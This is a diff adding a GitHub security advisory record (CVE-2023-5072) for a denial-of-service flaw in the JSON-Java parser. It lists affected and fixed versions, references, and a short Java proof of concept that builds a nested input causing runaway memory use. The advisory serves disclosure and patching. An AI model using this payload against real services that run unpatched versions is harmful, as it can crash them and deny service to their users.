@@ -1,0 +1,77 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-4jq9-2xhw-jpx7",
+  "modified": "2023-11-15T21:35:14Z",
+  "published": "2023-11-14T22:24:08Z",
+  "aliases": [
+    "CVE-2023-5072"
+  ],
+  "summary": "Java: DoS Vulnerability in JSON-JAVA",
+  "details": "### Summary\nA denial of service vulnerability in JSON-Java was discovered by [ClusterFuzz](https://google.github.io/clusterfuzz/).  A bug in the parser means that an input string of modest size can lead to indefinite amounts of memory being used. There are two issues: (1) the parser bug can be used to circumvent a check that is supposed to prevent the key in a JSON object from itself being another JSON object; (2) if a key does end up being a JSON object then it gets converted into a string, using `\\` to escape special characters, including `\\` itself. So by nesting JSON objects, with a key that is a JSON object that has a key that is a JSON object, and so on, we can get an exponential number of `\\` characters in the escaped string.\n\n### Severity\nHigh - Because this is an already-fixed DoS vulnerability, the only remaining impact possible is for existing binaries that have not been updated yet.\n\n### Proof of Concept\n```java\npackage orgjsonbug;\n\nimport org.json.JSONObject;\n\n/**\n * Illustrates a bug in JSON-Java.\n */\npublic class Bug {\n  private static String makeNested(int depth) {\n    if (depth == 0) {\n      return \"{\\\"a\\\":1}\";\n    }\n    return \"{\\\"a\\\":1;\\t\\0\" + makeNested(depth - 1) + \":1}\";\n  }\n\n  public static void main(String[] args) {\n    String input = makeNested(30);\n    System.out.printf(\"Input string has length %d: %s\\n\", input.length(), input);\n    JSONObject output = new JSONObject(input);\n    System.out.printf(\"Output JSONObject has length %d: %s\\n\", output.toString().length(), output);\n  }\n}\n```\nWhen run, this reports that the input string has length 367. Then, after a long pause, the program crashes inside new JSONObject with OutOfMemoryError.\n\n### Further Analysis\nThe issue is fixed by [this PR](https://github.com/stleary/JSON-java/pull/759).\n\n### Timeline\n**Date reported**: 07/14/2023\n**Date fixed**: \n**Date disclosed**: 10/12/2023",
+  "severity": [
+
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.json:json"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "20231013"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 20230618"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/google/security-research/security/advisories/GHSA-4jq9-2xhw-jpx7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5072"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stleary/JSON-java/issues/758"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stleary/JSON-java/issues/771"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stleary/JSON-java/pull/759"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stleary/JSON-java/commit/60662e2f8384d3449822a3a1179bfe8de67b55bb"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/stleary/JSON-java"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-358"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-11-14T22:24:08Z",
+    "nvd_published_at": null
+  }
+}
